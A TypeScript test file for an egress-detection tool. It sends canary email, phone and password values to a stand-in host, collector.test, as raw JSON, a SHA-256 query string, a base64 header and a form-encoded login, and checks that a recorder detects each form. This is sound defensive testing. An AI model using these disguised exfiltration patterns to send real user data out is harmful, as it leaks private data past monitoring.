import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { createHash } from 'node:crypto';
import http from 'node:http';
import { createCanary, canaryFields } from '../src/canary/factory.ts';
import { canaryVariants } from '../src/canary/variants.ts';
import { startEgressRecorder, matchRequest } from '../src/egress/recorder.ts';
import type { EgressRecorder } from '../src/egress/recorder.ts';

let recorder: EgressRecorder;
const canary = createCanary('det001');
const fields = canaryFields(canary);

beforeEach(() => {
  recorder = startEgressRecorder({ targetRoot: '/tmp' });
});

afterEach(() => {
  recorder.stop();
});

function httpPost(url: string, body: string, headers: Record<string, string> = {}): Promise<number> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const req = http.request(
      {
        hostname: parsed.hostname,
        port: parsed.port ? Number(parsed.port) : 80,
        path: parsed.pathname + parsed.search,
        method: 'POST',
        headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body), ...headers },
      },
      (res) => {
        res.resume();
        resolve(res.statusCode ?? 0);
      },
    );
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

describe('egress-detect', () => {
  it('raw email in JSON body is found as raw', async () => {
    const body = JSON.stringify({ email: canary.email });
    const status = await httpPost('http://collector.test/ingest', body);
    expect(status).toBe(200);

    const req = recorder.requests.find((r) => r.body.includes(canary.email));
    expect(req).toBeDefined();
    const matches = matchRequest(req!, fields);
    const rawEmail = matches.find((m) => m.field === 'email' && m.form === 'raw');
    expect(rawEmail).toBeDefined();
  });

  it('sha256(email) in query string is found as sha256', async () => {
    const emailHash = createHash('sha256').update(canary.email.trim().toLowerCase()).digest('hex');
    const url = `http://collector.test/track?h=${emailHash}`;

    const status = await new Promise<number>((resolve, reject) => {
      const req = http.request(url, { method: 'GET' }, (res) => {
        res.resume();
        resolve(res.statusCode ?? 0);
      });
      req.on('error', reject);
      req.end();
    });
    expect(status).toBe(200);

    const rec = recorder.requests.find((r) => r.url.includes(emailHash));
    expect(rec).toBeDefined();
    const matches = matchRequest(rec!, fields);
    const sha256Email = matches.find((m) => m.field === 'email' && m.form === 'sha256');
    expect(sha256Email).toBeDefined();
  });

  it('base64 phone in header is found as base64', async () => {
    const phoneB64 = Buffer.from(canary.phone).toString('base64');
    const status = await httpPost(
      'http://collector.test/event',
      JSON.stringify({}),
      { 'x-device-id': phoneB64 },
    );
    expect(status).toBe(200);

    const rec = recorder.requests.find((r) => r.headers['x-device-id'] === phoneB64);
    expect(rec).toBeDefined();
    const matches = matchRequest(rec!, fields);
    const b64Phone = matches.find((m) => m.field === 'phone' && m.form === 'base64');
    expect(b64Phone).toBeDefined();
  });

  it('form-encoded pw is found as raw (form variant deduped for no-space values)', async () => {
    // pw has no spaces so the form variant text equals raw text; body has the literal pw
    const pwRaw = canary.pw;
    // Use raw value directly (no encodeURIComponent) so body matches raw/form variant
    const body = `password=${pwRaw}&action=login`;

    const status = await new Promise<number>((resolve, reject) => {
      const parsed = new URL('http://collector.test/login');
      const req = http.request(
        {
          hostname: parsed.hostname,
          path: parsed.pathname,
          method: 'POST',
          headers: {
            'content-type': 'application/x-www-form-urlencoded',
            'content-length': Buffer.byteLength(body),
          },
        },
        (res) => {
          res.resume();
          resolve(res.statusCode ?? 0);
        },
      );
      req.on('error', reject);
      req.write(body);
      req.end();
    });
    expect(status).toBe(200);

    const rec = recorder.requests.find((r) => r.path.includes('login'));
    expect(rec).toBeDefined();
    const matches = matchRequest(rec!, fields);
    // pw is present in the body as raw (form == raw for no-space values; dedup keeps raw)
    const pwMatch = matches.find((m) => m.field === 'pw' && (m.form === 'raw' || m.form === 'form'));
    expect(pwMatch).toBeDefined();
  });

  it('fetch sends receive a 200 response', async () => {
    const res = await fetch('http://collector.test/fetch-check', {
      method: 'POST',
      body: JSON.stringify({ test: true }),
    });
    expect(res.status).toBe(200);
  });
});
